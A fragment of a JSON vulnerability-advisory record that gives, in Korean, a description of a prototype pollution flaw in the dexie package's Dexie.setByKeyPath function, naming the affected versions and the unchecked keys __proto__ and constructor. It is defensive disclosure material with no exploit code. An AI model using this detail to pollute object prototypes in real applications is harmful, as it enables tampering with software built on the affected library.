    "descriptionKR": "Dexie는 IndexedDB를 위한 최소한의 래퍼입니다. 3.2.2 이전, 4.0.0-alpha.1 및 4.0.0-alpha.3 이전 패키지 dexie는 키를 제대로 확인하지 않는 Dexie.setByKeyPath(obj, keyPath, value) 함수의 Prototype Pollution에 취약합니다. 설정 중입니다(__proto__ 또는 생성자처럼). 이를 통해 공격자는 Object.prototype의 속성을 추가/수정하여 프로토타입 오염 취약성을 유발할 수 있습니다. **참고:** 이 취약점은 신뢰할 수 없는 사용자 입력으로 컬렉션을 수정할 때와 같이 여러 가지 방식으로 발생할 수 있습니다."
  }
]